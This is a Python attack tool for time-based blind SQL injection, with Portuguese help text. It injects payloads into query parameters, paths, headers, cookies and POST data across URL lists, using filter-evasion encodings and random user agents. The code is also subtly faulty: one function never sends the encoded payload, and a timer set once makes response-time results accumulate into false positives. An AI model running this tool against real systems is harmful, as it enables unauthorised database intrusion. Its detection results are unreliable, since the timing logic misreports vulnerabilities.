import requests
import time
import argparse
import random
import threading
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, quote
from colorama import Fore, Style, init
import urllib3

VERSION = "1.0.0"

init(autoreset=True)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

user_agents = [    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:54.0) Gecko/20100101 Firefox/54.0",    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1 Safari/605.1.15",    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko",    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",]

def show_banner():
    banner = f"""
{Fore.RED}
 █     █░▓█████  ██▓     ██▓     ▄▄▄▄     ██████   █████   ██▓     ██▓
▓█░ █ ░█░▓█   ▀ ▓██▒    ▓██▒    ▓█████▄ ▒██    ▒ ▒██▓  ██▒▓██▒    ▓██▒
▒█░ █ ░█ ▒███   ▒██░    ▒██░    ▒██▒ ▄██░ ▓██▄   ▒██▒  ██░▒██░    ▒██▒
░█░ █ ░█ ▒▓█  ▄ ▒██░    ▒██░    ▒██░█▀    ▒   ██▒░██  █▀ ░▒██░    ░██░
░░██▒██▓ ░▒████▒░██████▒░██████▒░▓█  ▀█▓▒██████▒▒░▒███▒█▄ ░██████▒░██░
░ ▓░▒ ▒  ░░ ▒░ ░░ ▒░▓  ░░ ▒░▓  ░░▒▓███▀▒▒ ▒▓▒ ▒ ░░░ ▒▒░ ▒ ░ ▒░▓  ░░▓  
  ▒ ░ ░   ░ ░  ░░ ░ ▒  ░░ ░ ▒  ░▒░▒   ░ ░ ░▒  ░ ░ ░ ▒░  ░ ░ ░ ░  ░ ▒ ░
  ░   ░     ░     ░ ░     ░ ░    ░    ░ ░  ░  ░     ░   ░   ░ ░    ▒ ░
    ░       ░  ░    ░  ░    ░  ░ ░            ░      ░        ░  ░ ░  
                                      ░                               

{Style.RESET_ALL}
Created by well0x01

Time-based Blind SQL Injection Script

Options:
  -u, --url          URL que será testada
  -l, --list         Arquivo contendo uma lista de URLs para testar
  -p, --payload-file Arquivo contendo a lista de payloads para testar
  -o, --output       Arquivo para salvar os resultados de sucesso
  -s, --server-http  Proxy HTTP para direcionar as solicitações (ex: http://127.0.0.1:8080)
  -t, --threads      Número de threads para realizar as requisições (padrão: 2)
  -r, --requests     Arquivo contendo uma requisição HTTP para testar
  -v, --version      Exibe a versão atual do script
  -h, --help         Mostrar este banner e as opções disponíveis
"""
    print(banner)

def test_payload(url, payload, proxy, output_file=None):
    delay = int(payload.split('SLEEP(')[-1].split(')')[0]) if 'SLEEP(' in payload else 5
    start_time = time.time()
    headers = {
        'User-Agent': random.choice(user_agents),
        'Referer': payload,
        'Cookie': f'session=default; sessionid={payload}',
    }
    proxies = {'http': proxy, 'https': proxy} if proxy else None

    encodings = [        lambda s: quote(s),        lambda s: "".join([hex(ord(c)).replace("0x", "%") for c in s]),
        lambda s: s.encode('unicode-escape').decode('utf-8').replace("\\", "%"),
        lambda s: s.lower(),
        lambda s: s.upper(),
        lambda s: "".join([c if i % 2 == 0 else c.upper() for i, c in enumerate(s.lower())]),
        lambda s: "".join([f"{c}/**/" for c in s]),
        lambda s: "'||'".join(s.split()),
        lambda s: "".join([f"%{ord(c):02x}" for c in s]),
    ]

    for encoding in encodings:
        encoded_payload = encoding(payload)
        try:
            parsed_url = urlparse(url)
            if not parsed_url.scheme:
                url = "http://" + url

            response = requests.get(url, headers=headers, proxies=proxies, timeout=delay + 5, verify=False)
            elapsed_time = time.time() - start_time

            if elapsed_time > delay:
                result = f"Possível vulnerabilidade encontrada com o payload: {encoded_payload} na URL: {url} | Tempo de resposta: {elapsed_time:.2f} segundos\n"
                print(Fore.GREEN + result)
                if output_file:
                    with open(output_file, 'a') as f:
                        f.write(result + "\n")
            else:
                result = f"Payload não parece ter sucesso: {encoded_payload} na URL: {url} | Tempo de resposta: {elapsed_time:.2f} segundos\n"
                print(Fore.RED + result)
        except requests.exceptions.RequestException as e:
            print(Fore.RED + f"Erro ao testar o payload {encoded_payload} na URL: {url}: {e}\n")

def inject_payloads_in_url(url, payload):
    parsed_url = urlparse(url)
    query_params = parse_qs(parsed_url.query)

    for param in query_params:
        query_params[param] = payload

    new_query = urlencode(query_params, doseq=True)
    new_url = urlunparse(parsed_url._replace(query=new_query))

    new_path = parsed_url.path.rstrip('/') + '/' + payload
    new_url_with_path = urlunparse(parsed_url._replace(path=new_path))

    return [new_url, new_url_with_path]

def inject_payloads_in_headers(headers, payload):
    new_headers = headers.copy()
    for header in new_headers:
        new_headers[header] += f'; {payload}'
    return new_headers

def inject_payloads_in_post_data(data, payload):
    if isinstance(data, dict):
        for key in data:
            if isinstance(data[key], list):
                data[key].append(payload)
            else:
                data[key] += f'; {payload}'
    return data

def request_with_payloads(url, payload, headers, proxy, output_file, method="GET", data=None):
    delay = int(payload.split('SLEEP(')[-1].split(')')[0]) if 'SLEEP(' in payload else 5
    start_time = time.time()
    proxies = {'http': proxy, 'https': proxy} if proxy else None

    encodings = [        lambda s: quote(s),        lambda s: "".join([hex(ord(c)).replace("0x", "%") for c in s]),
        lambda s: s.encode('unicode-escape').decode('utf-8').replace("\\", "%"),
        lambda s: s.lower(),
        lambda s: s.upper(),
        lambda s: "".join([c if i % 2 == 0 else c.upper() for i, c in enumerate(s.lower())]),
        lambda s: "".join([f"{c}/**/" for c in s]),
        lambda s: "'||'".join(s.split()),
        lambda s: "".join([f"%{ord(c):02x}" for c in s]),
    ]

    for encoding in encodings:
        encoded_payload = encoding(payload)
        try:
            parsed_url = urlparse(url)
            if not parsed_url.scheme:
                url = "http://" + url

            if method == "POST":
                response = requests.post(url, headers=headers, proxies=proxies, data=data, timeout=delay + 5, verify=False)
            else:
                response = requests.get(url, headers=headers, proxies=proxies, timeout=delay + 5, verify=False)

            elapsed_time = time.time() - start_time

            if elapsed_time > delay:
                result = f"Possível vulnerabilidade encontrada com o payload: {encoded_payload} na URL: {url} | Tempo de resposta: {elapsed_time:.2f} segundos\n"
                print(Fore.GREEN + result)
                if output_file:
                    with open(output_file, 'a') as f:
                        f.write(result + "\n")
            else:
                result = f"Payload não parece ter sucesso: {encoded_payload} na URL: {url} | Tempo de resposta: {elapsed_time:.2f} segundos\n"
                print(Fore.RED + result)
        except requests.exceptions.RequestException as e:
            print(Fore.RED + f"Erro ao testar o payload {encoded_payload} na URL: {url}: {e}\n")

def process_request_file(request_file, payload_file, proxy, output_file):
    with open(request_file, 'r') as f:
        request_lines = f.readlines()

    method = request_lines[0].split()[0]
    path = request_lines[0].split()[1]
    headers = {}
    data = None
    in_headers = True
    host = ""

    for line in request_lines[1:]:
        if in_headers:
            if line.strip() == "":
                in_headers = False
            else:
                header, value = line.split(":", 1)
                headers[header.strip()] = value.strip()
                if header.strip().lower() == "host":
                    host = value.strip()
        else:
            if data is None:
                data = line.strip()
            else:
                data += "\n" + line.strip()

    if not host:
        raise ValueError("Host header is missing in the request file")

    url = f"http://{host}{path}" if not path.startswith("http") else path

    with open(payload_file, 'r') as f:
        payloads = [line.strip() for line in f]

    for payload in payloads:
        for header in headers:
            new_headers = headers.copy()
            new_headers[header] = f"{headers[header]}; {payload}"
            request_with_payloads(url, payload, new_headers, proxy, output_file, method, data)

        if data:
            body_params = parse_qs(data)
            for param in body_params:
                new_data = body_params.copy()
                new_data[param] = f"{body_params[param]}; {payload}"
                encoded_data = urlencode(new_data, doseq=True)
                request_with_payloads(url, payload, headers, proxy, output_file, method, encoded_data)

        parsed_url = urlparse(url)
        query_params = parse_qs(parsed_url.query)
        for param in query_params:
            new_query_params = query_params.copy()
            new_query_params[param] = f"{query_params[param]}; {payload}"
            new_query = urlencode(new_query_params, doseq=True)
            new_url = urlunparse(parsed_url._replace(query=new_query))
            request_with_payloads(new_url, payload, headers, proxy, output_file, method, data)

        new_path = parsed_url.path.rstrip('/') + f"/{payload}"
        new_url_with_path = urlunparse(parsed_url._replace(path=new_path))
        request_with_payloads(new_url_with_path, payload, headers, proxy, output_file, method, data)

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", help="URL que será testada")
    parser.add_argument("-l", "--list", help="Arquivo contendo uma lista de URLs para testar")
    parser.add_argument("-p", "--payload-file", help="Arquivo contendo a lista de payloads para testar")
    parser.add_argument("-o", "--output", help="Arquivo para salvar os resultados de sucesso")
    parser.add_argument("-s", "--server-http", help="Proxy HTTP para direcionar as solicitações (ex: http://127.0.0.1:8080)")
    parser.add_argument("-t", "--threads", type=int, default=2, help="Número de threads para realizar as requisições (padrão: 2)")
    parser.add_argument("-r", "--requests", help="Arquivo contendo uma requisição HTTP para testar")
    parser.add_argument("-v", "--version", action="store_true", help="Exibe a versão atual do script")
    args = parser.parse_args()

    if args.version:
        print(f"Version: {VERSION}")
        return

    show_banner()

    if args.url and args.payload_file:
        with open(args.payload_file, 'r') as f:
            payloads = [line.strip() for line in f]

        threads = []
        for payload in payloads:
            t = threading.Thread(target=test_payload, args=(args.url, payload, args.server_http, args.output))
            t.start()
            threads.append(t)

            if len(threads) >= args.threads:
                for t in threads:
                    t.join()
                threads = []

        for t in threads:
            t.join()
    elif args.list and args.payload_file:
        with open(args.list, 'r') as f:
            urls = [line.strip() for line in f]

        with open(args.payload_file, 'r') as f:
            payloads = [line.strip() for line in f]

        threads = []
        for url in urls:
            for payload in payloads:
                t = threading.Thread(target=test_payload, args=(url, payload, args.server_http, args.output))
                t.start()
                threads.append(t)

                if len(threads) >= args.threads:
                    for t in threads:
                        t.join()
                    threads = []

        for t in threads:
            t.join()
    elif args.requests and args.payload_file:
        process_request_file(args.requests, args.payload_file, args.server_http, args.output)
    else:
        parser.print_help()

if __name__ == "__main__":
    main()
